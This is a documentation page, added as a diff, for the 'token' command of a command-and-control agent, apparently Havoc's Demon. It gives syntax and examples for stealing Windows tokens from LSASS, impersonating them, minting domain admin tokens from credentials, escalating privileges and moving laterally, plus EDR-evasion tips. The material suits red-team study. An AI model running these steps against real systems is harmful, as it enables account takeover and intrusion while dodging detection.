@@ -1,0 +1,403 @@
+---
+title: token
+description: Token management vault for token theft, impersonation, and privilege manipulation
+---
+
+## Overview
+
+The `token` command implements a comprehensive token management system that allows operators to steal, store, impersonate, and create Windows access tokens. All stolen tokens are preserved in a token vault for later use.
+
+## Token Vault
+
+Tokens are duplicated with `SecurityIdentification` and `SecurityImpersonate` privileges, allowing `OpenThreadToken` to work on impersonated UIDs with `OpenAsSelf` set to TRUE.
+
+## Syntax
+
+```bash
+token [subcommand] [parameters]
+```
+
+## Subcommands
+
+### getuid
+
+Display the current user context from the active token.
+
+```bash
+token getuid
+```
+
+<ResponseField name="username" type="string">
+  Current user in DOMAIN\username format
+</ResponseField>
+
+<ResponseField name="sid" type="string">
+  Security Identifier (SID) of the current user
+</ResponseField>
+
+<ResponseField name="type" type="string">
+  Token type: Primary or Impersonation
+</ResponseField>
+
+### list
+
+Display all tokens currently stored in the token vault.
+
+```bash
+token list
+```
+
+<ResponseField name="tokens" type="array">
+  <ResponseField name="id" type="integer">
+    Vault ID for the token (used for impersonation)
+  </ResponseField>
+  
+  <ResponseField name="username" type="string">
+    User associated with the token
+  </ResponseField>
+  
+  <ResponseField name="domain" type="string">
+    Domain or computer name
+  </ResponseField>
+  
+  <ResponseField name="type" type="string">
+    Token type (Primary or Impersonation)
+  </ResponseField>
+  
+  <ResponseField name="impersonation_level" type="string">
+    Impersonation level (SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation)
+  </ResponseField>
+</ResponseField>
+
+### find-tokens
+
+Enumerate all accessible tokens on the system that can be stolen.
+
+```bash
+token find-tokens
+```
+
+Scans running processes and identifies tokens that can be duplicated.
+
+<ResponseField name="available_tokens" type="array">
+  <ResponseField name="pid" type="integer">
+    Process ID containing the token
+  </ResponseField>
+  
+  <ResponseField name="process" type="string">
+    Process name
+  </ResponseField>
+  
+  <ResponseField name="username" type="string">
+    User context of the token
+  </ResponseField>
+  
+  <ResponseField name="session" type="integer">
+    Session ID
+  </ResponseField>
+</ResponseField>
+
+### steal
+
+Steal a token from a specified process and add it to the vault.
+
+```bash
+token steal [pid] [handle]
+```
+
+<ParamField path="pid" type="integer" required>
+  Process identifier to steal token from
+</ParamField>
+
+<ParamField path="handle" type="hex" optional>
+  Specific token handle to duplicate (optional, defaults to primary token)
+</ParamField>
+
+### impersonate
+
+Impersonate a token from the vault.
+
+```bash
+token impersonate [id]
+```
+
+<ParamField path="id" type="integer" required>
+  Token vault ID (from `token list`)
+</ParamField>
+
+### make
+
+Create a new token from credentials and add it to the vault.
+
+```bash
+token make [domain] [username] [password] [logon_type]
+```
+
+<ParamField path="domain" type="string" required>
+  Domain name or computer name for local accounts
+</ParamField>
+
+<ParamField path="username" type="string" required>
+  Username for authentication
+</ParamField>
+
+<ParamField path="password" type="string" required>
+  Password for authentication
+</ParamField>
+
+<ParamField path="logon_type" type="integer" default="9">
+  Windows logon type:
+  - `2` - Interactive (LOGON32_LOGON_INTERACTIVE)
+  - `3` - Network (LOGON32_LOGON_NETWORK)
+  - `4` - Batch (LOGON32_LOGON_BATCH)
+  - `5` - Service (LOGON32_LOGON_SERVICE)
+  - `9` - NewCredentials (LOGON32_LOGON_NEW_CREDENTIALS) - Default
+</ParamField>
+
+### privs-get
+
+Attempt to enable all privileges on the current token.
+
+```bash
+token privs-get
+```
+
+Attempts to enable:
+- SeDebugPrivilege
+- SeImpersonatePrivilege
+- SeTcbPrivilege
+- And all other available privileges
+
+### privs-list
+
+List all privileges and their status for the current token.
+
+```bash
+token privs-list
+```
+
+<ResponseField name="privileges" type="array">
+  <ResponseField name="name" type="string">
+    Privilege name (e.g., SeDebugPrivilege)
+  </ResponseField>
+  
+  <ResponseField name="status" type="string">
+    Enabled or Disabled
+  </ResponseField>
+  
+  <ResponseField name="description" type="string">
+    Human-readable description of the privilege
+  </ResponseField>
+</ResponseField>
+
+### revert
+
+Revert to the original process token.
+
+```bash
+token revert
+```
+
+Stops impersonating any token and returns to the default process token.
+
+### remove
+
+Remove a token from the vault.
+
+```bash
+token remove [id]
+```
+
+<ParamField path="id" type="integer" required>
+  Token vault ID to remove
+</ParamField>
+
+### clear
+
+Remove all tokens from the vault.
+
+```bash
+token clear
+```
+
+Clears the entire token vault and reverts to the original process token.
+
+## Examples
+
+### Basic Token Theft and Impersonation
+
+```bash
+# Find available tokens
+token find-tokens
+
+# Steal token from LSASS (PID 644)
+token steal 644
+
+# List vault to get token ID
+token list
+
+# Impersonate the stolen token (ID 1)
+token impersonate 1
+
+# Verify current context
+token getuid
+```
+
+### Create Token from Credentials
+
+```bash
+# Create token for domain admin
+token make CORP admin Password123! 9
+
+# List tokens to get ID
+token list
+
+# Impersonate the new token
+token impersonate 2
+```
+
+### Privilege Escalation
+
+```bash
+# Check current privileges
+token privs-list
+
+# Enable all available privileges
+token privs-get
+
+# Verify privileges are enabled
+token privs-list
+```
+
+### Multiple Token Management
+
+```bash
+# Steal multiple tokens
+token steal 644   # SYSTEM from lsass
+token steal 1520  # User from explorer
+token steal 2048  # Admin from services
+
+# List all tokens
+token list
+
+# Switch between contexts
+token impersonate 1  # SYSTEM
+token getuid
+
+token impersonate 3  # Admin
+token getuid
+
+# Revert to original
+token revert
+token getuid
+```
+
+### Cleanup
+
+```bash
+# Remove specific token
+token remove 2
+
+# Or clear all tokens
+token clear
+```
+
+## OPSEC Considerations
+
+<Warning>
+  Token operations can generate significant security events and may be monitored by EDR solutions.
+</Warning>
+
+### Token Theft Detection
+
+- Opening process handles (especially to LSASS) triggers monitoring
+- `OpenProcessToken` and `DuplicateTokenEx` are commonly hooked
+- Consider using indirect syscalls for token operations
+- Avoid repeatedly accessing sensitive processes
+
+### Impersonation Detection
+
+- Thread token changes may be logged by security products
+- Some actions while impersonating generate events with the impersonated user
+- Network authentication will use the impersonated context
+
+### Best Practices
+
+1. **Selective Theft**: Only steal tokens you need
+2. **Clean Up**: Remove tokens from vault when done
+3. **Verification**: Always verify context with `token getuid` after impersonation
+4. **Revert**: Use `token revert` when impersonation is no longer needed
+5. **Privilege Management**: Only enable required privileges, not all
+
+## Use Cases
+
+### Lateral Movement
+
+```bash
+# Steal domain admin token
+token find-tokens
+token steal 2048
+token impersonate 1
+
+# Access remote system with elevated context
+fs dir \\DC01\C$
+```
+
+### Privilege Escalation
+
+```bash
+# Steal SYSTEM token from winlogon or lsass
+proc grep winlogon
+token steal 644
+token impersonate 1
+
+# Enable debug privilege
+token privs-get
+```
+
+### Credential-Based Access
+
+```bash
+# Create token from plaintext credentials
+token make CORP administrator Password123! 9
+token impersonate 1
+
+# Access resources as that user
+net dclist CORP
+```
+
+## Token Types
+
+<Tabs>
+  <Tab title="Primary Token">
+    Represents the security context of a process.
+    
+    - Associated with processes
+    - Contains user SID, groups, privileges
+    - Used for process-level access checks
+  </Tab>
+  
+  <Tab title="Impersonation Token">
+    Allows a thread to execute in a different security context.
+    
+    - Associated with threads
+    - Has impersonation levels (Anonymous, Identification, Impersonation, Delegation)
+    - Used by Demon for context switching
+  </Tab>
+</Tabs>
+
+## Impersonation Levels
+
+- **SecurityAnonymous** (0): Server cannot impersonate or identify client
+- **SecurityIdentification** (1): Server can obtain identity and privileges but cannot impersonate
+- **SecurityImpersonation** (2): Server can impersonate client's security context on local system
+- **SecurityDelegation** (3): Server can impersonate client's security context on remote systems
+
+## Notes
+
+- Token vault is maintained per-agent session
+- Tokens do not persist across agent restarts
+- Impersonation affects the current thread only
+- Network operations use the impersonated token automatically
+- Some operations require specific privileges (e.g., `SeDebugPrivilege` for stealing from protected processes)
+- Delegation-level tokens are rare and valuable for remote access
